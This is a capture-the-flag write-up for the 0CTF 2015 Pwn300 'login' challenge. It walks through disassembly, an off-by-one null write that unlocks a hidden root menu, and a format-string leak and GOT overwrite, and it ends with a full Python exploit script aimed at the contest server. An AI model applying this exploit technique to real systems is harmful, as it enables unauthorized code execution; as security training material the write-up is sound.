# 0CTF 2015 Quals Pwn300 Login write-up

```shell
Login as guest. Logout as root.
```
flag: 0ctf{login_success_and_welcome_back}  

My friend HuyNA and I solved this task together :) Nice team.   
login is a 64bit ELF file.   
Check with peda:
```sh
gdb-peda$ file login
Reading symbols from login...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```
CANARY    : ENABLED --\> stack_chk_fail() is available.  
NX        : ENABLED --\> data areas of memory as non-executable.  
PIE       : ENABLED --\> leak something to calculate base addresses. binary is loaded at a different address each time.  
RELRO     : FULL    --\> GOT is read-only

and libc:  
```sh
CANARY    : ENABLED  
FORTIFY   : ENABLED  
NX        : ENABLED  
PIE       : Dynamic Shared Object  
RELRO     : Partial --------> GOT is still writeable (good!)  
```
this program uses hard-coded login user name and password for guest.  
After reversing, I find username and password for guest and "normal mode" is not enabled.  
```asm
.text:0000000000000E3A guest_login     proc near 
.text:0000000000000E3A s1              = byte ptr -80h
.text:0000000000000E3A var_40          = byte ptr -40h
.text:0000000000000E3A var_8           = qword ptr -8
.text:0000000000000E3A      push    rbp
.text:0000000000000E3B      mov     rbp, rsp
.text:0000000000000E3E      add     rsp, -80h
.text:0000000000000E42      mov     rax, fs:28h
.text:0000000000000E4B      mov     [rbp+var_8], rax
.text:0000000000000E4F      xor     eax, eax
.text:0000000000000E51      lea     rdi, aLogin     ; "Login: "
.text:0000000000000E58      mov     eax, 0
.text:0000000000000E5D      call    _printf
.text:0000000000000E62      lea     rax, [rbp+s1]
.text:0000000000000E66      mov     rsi, rax
.text:0000000000000E69      lea     rdi, a32s       ; "%32s"
.text:0000000000000E70      mov     eax, 0
.text:0000000000000E75      call    ___isoc99_scanf
.text:0000000000000E7A      lea     rdi, aPassword  ; "Password: "
.text:0000000000000E81      mov     eax, 0
.text:0000000000000E86      call    _printf
.text:0000000000000E8B      lea     rax, [rbp+var_40]
.text:0000000000000E8F      mov     rsi, rax
.text:0000000000000E92      lea     rdi, a32s       ; "%32s"
.text:0000000000000E99      mov     eax, 0
.text:0000000000000E9E      call    ___isoc99_scanf
.text:0000000000000EA3      lea     rax, [rbp+s1]
.text:0000000000000EA7      lea     rsi, s2         ; "guest"  - Hardcoded username
.text:0000000000000EAE      mov     rdi, rax        ; s1
.text:0000000000000EB1      call    _strcmp
.text:0000000000000EB6      test    eax, eax
.text:0000000000000EB8      jnz     short loc_ED1
.text:0000000000000EBA      lea     rax, [rbp+var_40]
.text:0000000000000EBE      lea     rsi, aGuest123  ; "guest123"  Hardcoded password
.text:0000000000000EC5      mov     rdi, rax        ; s1
.text:0000000000000EC8      call    _strcmp
.text:0000000000000ECD      test    eax, eax
.text:0000000000000ECF      jz      short loc_EE7
.text:0000000000000ED1      lea     rdi, aInvalidUsernam ; "Invalid username or password."
.text:0000000000000ED8      call    _puts
.text:0000000000000EDD      mov     edi, 0          ; status
.text:0000000000000EE2      call    _exit
.text:0000000000000EE7      lea     rax, [rbp+s1]
.text:0000000000000EEB      mov     rsi, rax        ; src
.text:0000000000000EEE      lea     rax, user_name
.text:0000000000000EF5      mov     rdi, rax        ; dest
.text:0000000000000EF8      call    _strcpy
.text:0000000000000EFD      lea     rax, user_name
.text:0000000000000F04      mov     dword ptr [rax+100h], 1 ; disable "normal mode"
.text:0000000000000F0E      mov     rax, [rbp+var_8]
.text:0000000000000F12      xor     rax, fs:28h
.text:0000000000000F1B      jz      short locret_F22
.text:0000000000000F1D      call    ___stack_chk_fail
.text:0000000000000F22      leave
.text:0000000000000F23      retn
.text:0000000000000F23 guest_login     endp
```
```sh
Login: guest
Password: guest123
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 1
Username: guest
Level: Guest
```
Looking at the menu, I see 3 choices, but it has a secret option:  
```asm
.text:0000000000001265                 call    show_menu
.text:000000000000126A                 mov     [rbp+choice], eax
.text:000000000000126D                 mov     eax, [rbp+choice]
.text:0000000000001270                 cmp     eax, 2
.text:0000000000001273                 jz      short loc_1299
.text:0000000000001275                 cmp     eax, 2
.text:0000000000001278                 jg      short loc_1281
.text:000000000000127A                 cmp     eax, 1
.text:000000000000127D                 jz      short loc_128D
.text:000000000000127F                 jmp     short loc_12E3
.text:0000000000001281 loc_1281:                             
.text:0000000000001281                 cmp     eax, 3
.text:0000000000001284                 jz      short loc_12A5
.text:0000000000001286                 cmp     eax, 4          ; enter hidden option
.text:0000000000001289                 jz      short loc_12B8
.text:000000000000128B                 jmp     short loc_12E3
						.......
.text:00000000000012B8 loc_12B8:                             
.text:00000000000012B8                 lea     rax, user_name
.text:00000000000012BF                 mov     eax, [rax+100h]	; check "normal mode"
.text:00000000000012C5                 test    eax, eax
.text:00000000000012C7                 jnz     short loc_12D5 ; 0x00 is enabled
.text:00000000000012C9                 mov     eax, 0
.text:00000000000012CE                 call    login_as_root
```
and with number 2, we can change username.  
```asm
.text:0000000000000F7A change_username proc near  
.text:0000000000000F7A   push    rbp
.text:0000000000000F7B   mov     rbp, rsp
.text:0000000000000F7E   lea     rdi, aEnterYourNewUs ; "Enter your new username:"
.text:0000000000000F85   call    _puts
.text:0000000000000F8A   lea     rax, user_name
.text:0000000000000F91   mov     rsi, rax
.text:0000000000000F94   lea     rdi, a256s      ; "%256s"
.text:0000000000000F9B   mov     eax, 0
.text:0000000000000FA0   call    ___isoc99_scanf
.text:0000000000000FA5   lea     rdi, aDone_     ; "Done."
.text:0000000000000FAC   call    _puts
.text:0000000000000FB1   pop     rbp
.text:0000000000000FB2   retn
.text:0000000000000FB2 change_username endp
```
This program allows us to enter at most 256 characters. A terminating null character is automatically added at the end of the stored string.  
I enter 256 characters and let program overwrite "normal mode". It is set to 0x00.
```sh
Your choice: 1
Username: guest
Level: Guest
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 2
Enter your new username:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Done.
== 0CTF Login System ==
1. Show Profile
2. Login as User
3. Logout
=======================
Your choice: 1
Username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Level: Normal User
```
login_as_root(name of this function is named by me) allows users to enter username and password for root. The binary takes the md5 of our supplied password, but compares it to 0ops{secret_md5}. If users provide a valid input, program will show the flag. Because this is an exploit challenge, I don't think I have to break MD5 to capture the flag. Easily, I found the vulnerability: format string vulnerability.
```asm
.text:000000000000103B login_as_root   proc near       
.text:000000000000103B var_220         = byte ptr -220h
.text:000000000000103B user            = byte ptr -210h
.text:000000000000103B s               = byte ptr -110h
.text:000000000000103B var_8           = qword ptr -8
.text:000000000000103B        push    rbp
.text:000000000000103C        mov     rbp, rsp
.text:000000000000103F        sub     rsp, 220h
.text:0000000000001046        mov     rax, fs:28h
.text:000000000000104F        mov     [rbp+var_8], rax
.text:0000000000001053        xor     eax, eax
.text:0000000000001055        lea     rdi, aLogin     ; "Login: "
.text:000000000000105C        mov     eax, 0
.text:0000000000001061        call    _printf
.text:0000000000001066        lea     rax, [rbp+user]
.text:000000000000106D        mov     esi, 100h
.text:0000000000001072        mov     rdi, rax
.text:0000000000001075        call    user_input_str
.text:000000000000107A        lea     rdi, aPassword  ; "Password: "
.text:0000000000001081        mov     eax, 0
.text:0000000000001086        call    _printf
.text:000000000000108B        lea     rax, [rbp+s]
.text:0000000000001092        mov     esi, 100h
.text:0000000000001097        mov     rdi, rax
.text:000000000000109A        call    user_input_str
.text:000000000000109F        lea     rax, [rbp+s]
.text:00000000000010A6        mov     rdi, rax        ; s
.text:00000000000010A9        call    _strlen
.text:00000000000010AE        mov     rcx, rax
.text:00000000000010B1        lea     rdx, [rbp+var_220]
.text:00000000000010B8        lea     rax, [rbp+s]
.text:00000000000010BF        mov     rsi, rcx
.text:00000000000010C2        mov     rdi, rax
.text:00000000000010C5        call    _MD5
.text:00000000000010CA        lea     rax, [rbp+user]
.text:00000000000010D1        lea     rsi, aRoot      ; "root"
.text:00000000000010D8        mov     rdi, rax        ; s1
.text:00000000000010DB        call    _strcmp
.text:00000000000010E0        test    eax, eax
.text:00000000000010E2        jnz     short loc_1112
.text:00000000000010E4        lea     rax, [rbp+var_220]
.text:00000000000010EB        mov     edx, 10h        ; n
.text:00000000000010F0        lea     rsi, a0opsSecret_md5 ; "0ops{secret_MD5}"
.text:00000000000010F7        mov     rdi, rax        ; s1
.text:00000000000010FA        call    _memcmp
.text:00000000000010FF        test    eax, eax
.text:0000000000001101        jnz     short loc_1112
.text:0000000000001103        mov     eax, 0
.text:0000000000001108        call    sub_FB3		; Flag is here
.text:000000000000110D        jmp     loc_122E
.text:0000000000001112 loc_1112: 
.text:0000000000001112        lea     rax, [rbp+user]
.text:0000000000001119        mov     rdi, rax        ; vulnerability 
.text:000000000000111C        mov     eax, 0
.text:0000000000001121        call    _printf		
.text:0000000000001126        lea     rdi, aLoginFailed_ ; " login failed."
.text:000000000000112D        call    _puts
.text:0000000000001132        lea     rdi, a1ChanceRemaini ; "1 chance remaining."
.text:0000000000001139        call    _puts
.text:000000000000113E        lea     rdi, aLogin     ; "Login: "
.text:0000000000001145        mov     eax, 0
.text:000000000000114A        call    _printf
.text:000000000000114F        lea     rax, [rbp+user]
.text:0000000000001156        mov     esi, 100h
.text:000000000000115B        mov     rdi, rax
.text:000000000000115E        call    user_input_str
.text:0000000000001163        lea     rdi, aPassword  ; "Password: "
.text:000000000000116A        mov     eax, 0
.text:000000000000116F        call    _printf
.text:0000000000001174        lea     rax, [rbp+s]
.text:000000000000117B        mov     esi, 100h
.text:0000000000001180        mov     rdi, rax
.text:0000000000001183        call    user_input_str
.text:0000000000001188        lea     rax, [rbp+s]
.text:000000000000118F        mov     rdi, rax        ; s
.text:0000000000001192        call    _strlen
.text:0000000000001197        mov     rcx, rax
.text:000000000000119A        lea     rdx, [rbp+var_220]
.text:00000000000011A1        lea     rax, [rbp+s]
.text:00000000000011A8        mov     rsi, rcx
.text:00000000000011AB        mov     rdi, rax
.text:00000000000011AE        call    _MD5
.text:00000000000011B3        lea     rax, [rbp+user]
.text:00000000000011BA        lea     rsi, aRoot      ; "root"
.text:00000000000011C1        mov     rdi, rax        ; s1
.text:00000000000011C4        call    _strcmp
.text:00000000000011C9        test    eax, eax
.text:00000000000011CB        jnz     short loc_11F8
.text:00000000000011CD        lea     rax, [rbp+var_220]
.text:00000000000011D4        mov     edx, 10h        ; n
.text:00000000000011D9        lea     rsi, a0opsSecret_md5 ; "0ops{secret_MD5}"
.text:00000000000011E0        mov     rdi, rax        ; s1
.text:00000000000011E3        call    _memcmp
.text:00000000000011E8        test    eax, eax
.text:00000000000011EA        jnz     short loc_11F8
.text:00000000000011EC        mov     eax, 0
.text:00000000000011F1        call    sub_FB3
.text:00000000000011F6        jmp     short loc_122E
.text:00000000000011F8        lea     rax, [rbp+user]
.text:00000000000011FF        mov     rdi, rax        ; vulnerability
.text:0000000000001202        mov     eax, 0
.text:0000000000001207        call    _printf
.text:000000000000120C        lea     rdi, aLoginFailed_ ; " login failed."
.text:0000000000001213        call    _puts
.text:0000000000001218        lea     rdi, aThreatDetected ; "Threat detected. System shutdown."
.text:000000000000121F        call    _puts
.text:0000000000001224        mov     edi, 1          ; status
.text:0000000000001229        call    _exit			
.text:000000000000122E loc_122E:         
.text:000000000000122E        mov     rax, [rbp+var_8]
.text:0000000000001232        xor     rax, fs:28h
.text:000000000000123B        jz      short locret_1242
.text:000000000000123D        call    ___stack_chk_fail
.text:0000000000001242 locret_1242:         
.text:0000000000001242        leave
.text:0000000000001243        retn
.text:0000000000001243 login_as_root   endp
```

"read flag" function:
```asm
.text:0000000000000FB3 sub_FB3  proc near 
.text:0000000000000FB3 fd       = dword ptr -118h
.text:0000000000000FB3 var_114  = dword ptr -114h
.text:0000000000000FB3 buf      = byte ptr -110h
.text:0000000000000FB3 var_8    = qword ptr -8
.text:0000000000000FB3          push    rbp
.text:0000000000000FB4          mov     rbp, rsp
.text:0000000000000FB7          sub     rsp, 120h
.text:0000000000000FBE          mov     rax, fs:28h
.text:0000000000000FC7          mov     [rbp+var_8], rax
.text:0000000000000FCB          xor     eax, eax
.text:0000000000000FCD          mov     esi, 0          ; oflag
.text:0000000000000FD2          lea     rdi, file       ; "flag"
.text:0000000000000FD9          mov     eax, 0
.text:0000000000000FDE          call    _open
.text:0000000000000FE3          mov     [rbp+fd], eax
.text:0000000000000FE9          lea     rcx, [rbp+buf]
.text:0000000000000FF0          mov     eax, [rbp+fd]
.text:0000000000000FF6          mov     edx, 100h       ; nbytes
.text:0000000000000FFB          mov     rsi, rcx        ; buf
.text:0000000000000FFE          mov     edi, eax        ; fd
.text:0000000000001000          call    _read
.text:0000000000001005          mov     [rbp+var_114], eax
.text:000000000000100B          cmp     [rbp+var_114], 0
.text:0000000000001012          jle     short loc_1031
.text:0000000000001014          mov     eax, [rbp+var_114]
.text:000000000000101A          movsxd  rdx, eax        ; n
.text:000000000000101D          lea     rax, [rbp+buf]
.text:0000000000001024          mov     rsi, rax        ; buf
.text:0000000000001027          mov     edi, 1          ; fd
.text:000000000000102C          call    _write
.text:0000000000001031
.text:0000000000001031 loc_1031:                     
.text:0000000000001031          mov     edi, 0          ; status
.text:0000000000001036          call    _exit
.text:0000000000001036 sub_FB3  endp
```

login_as_root calls exit() to terminate process.
Let's see exit() function:
```asm
.text:000000000003C290 exit       proc near   
.text:000000000003C290            lea     rsi, off_3BE6C8
.text:000000000003C297            sub     rsp, 8
.text:000000000003C29B            mov     edx, 1
.text:000000000003C2A0            call    sub_3C180
.text:000000000003C2A0 exit       endp
                                  
.text:000000000003C180 sub_3C180  proc near  
.text:000000000003C180            push    r13
.text:000000000003C182            push    r12
.text:000000000003C184            mov     r12d, edx
.text:000000000003C187            push    rbp
.text:000000000003C188            mov     rbp, rsi
.text:000000000003C18B            push    rbx
.text:000000000003C18C            mov     ebx, edi
.text:000000000003C18E            sub     rsp, 8
.text:000000000003C192            call    __call_tls_dtors
                                  
.text:000000000003C860 __call_tls_dtors proc near    
.text:000000000003C860            push    r12
.text:000000000003C862            push    rbp
.text:000000000003C863            push    rbx
.text:000000000003C864            lea     rdi, qword_3BDD90
.text:000000000003C86B            call    ___tls_get_addr

.plt:000000000001F420 ___tls_get_addr proc near    
.plt:000000000001F420                 jmp     cs:off_3BE038
.plt:000000000001F420 ___tls_get_addr endp

.got.plt:00000000003BE038 off_3BE038      dq offset __tls_get_addr
```
We get two chances. I used the first to leak libc address and an address of the binary. The second printf call is used to write into libc's GOT.  
I found __tls_get_addr entry to overwrite with sub_FB3().

We have a chain:  
	user inputs username (the first time) --\> printf() vulnerability --\> leak an address of the binary and the other one of libc --\> user inputs username (the second time)--\> printf() vulnerability --\> overwrite (lic_base + 0x3BE038) with "read flag" function --\> call exit() --\> call __call_tls_dtors --> call __\_tls_get_addr --\> get flag!
	
In "read flag" function, we will have a loop:  
"read flag" function --\> open("flag") --\> read flag --\> write to stdout --\> call exit() --\> call __call_tls_dtors --\> call __\_tls_get_addr --\> "read flag" function.  
The program will crash after a few loops, who cares?

Exploit code:
```python
#!/usr/bin/env python
import socket
import sys
import struct
import time
import telnetlib
import string
#  LD_PRELOAD=./libc.so.6_1 socat TCP-LISTEN:4000,reuseaddr,fork EXEC:./login.p
#  gdb attach $(ps aux | grep -v grep| grep -v fork| grep ./login|awk '{print $2}')

HOST = '202.112.26.107'
PORT = 10910
#HOST = '192.168.66.150'
#PORT = 4000
def recv_until(sock, delim):
    buf = ""
    while delim not in buf:
        buf += sock.recv(1)

    return buf

def exploit(sock):
    print ' [+] login as guest'
    recv_until(sock, 'Login:')
    sock.sendall('guest\n')
    recv_until(sock, 'Password:')
    sock.sendall('guest123\n')

    # change name --> enable normal mode
    print ' [+] enable normal mode'
    recv_until(sock, 'Your choice:')
    sock.sendall('2\n')
    recv_until(sock, 'Enter your new username:')
    sock.sendall('guest' + '\x00' * 251)

    # enter root mode
    print ' [+] enter root mode'
    recv_until(sock, 'Your choice:')
    sock.sendall('4\n')
    recv_until(sock, 'Login: ')
    user_name = '%75$16lx%16$16lx'
    sock.sendall(user_name + '\n')
    recv_until(sock, 'Password: ')
    sock.sendall('123456\n')

    # leak image base
    buf = recv_until(sock, 'login failed.')
    token = buf.split(' ')
    image_base= int( token[4], 16) - 0x12D3
    libc_base = int( token[8], 16) - 0x10D78
    print ' [+] image_base=', hex(image_base), 'libc_base =', hex(libc_base)
    read_flag= image_base + 0xFB3
    __tls_get_addr = libc_base + 0x03BE038

    a = (read_flag &0xffff)
    b = ((read_flag &0xffffffff) >> 16) &0xffff
    read_flag = read_flag >> 32
    c = (read_flag &0xffff)
    d = ((read_flag &0xffffffff) >> 16) &0xffff

    recv_until(sock, '1 chance remaining')
    recv_until(sock, 'Login: ')
    i = 15
    user_name  = '%' + str(a) + 'x%'+str(i)+'$hn'
    i +=1
    if (b > a):
        user_name += '%' + str(b-a)
    else:
        user_name += '%' + str(0x10000 + b-a)
    user_name += 'x%'+str(i)+'$hn'
    i +=1

    if (c > b):
        user_name += '%' + str(c-b)
    else:
        user_name += '%' + str(0x10000 + c-b)

    user_name += 'x%'+str(i)+'$hn'
    i +=1

    if (d > c):
        user_name += '%' + str(d-c)
    else:
        user_name += '%' + str(0x10000 + d-c)
    user_name += 'x%'+str(i)+'$hn'
    i +=1

    if len(user_name) % 8 > 0:
        user_name += ' '*(8-len(user_name) % 8)

    user_name += struct.pack('<Q', __tls_get_addr)
    user_name += struct.pack('<Q', __tls_get_addr + 2)
    user_name += struct.pack('<Q', __tls_get_addr + 4)
    user_name += struct.pack('<Q', __tls_get_addr + 6)

    repr(user_name)
    sock.sendall(user_name + '\n')
    recv_until(sock, 'Password: ')
    sock.sendall('123456\n')
    recv_until(sock, 'System shutdown.')
    print ' [+] Get flag'
    while True:
        buf = sock.recv(1024)
        if not buf: break
        print repr(buf)

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST, PORT))
    except socket.error, msg:
        sys.stderr.write("[ERROR] %s\n" % msg[1])
        sys.exit(1)

    print ' [+] Connected to',(HOST, PORT)
    exploit(sock)
    sock.close()
    sys.exit(0)

if __name__ == "__main__":
    main()
```
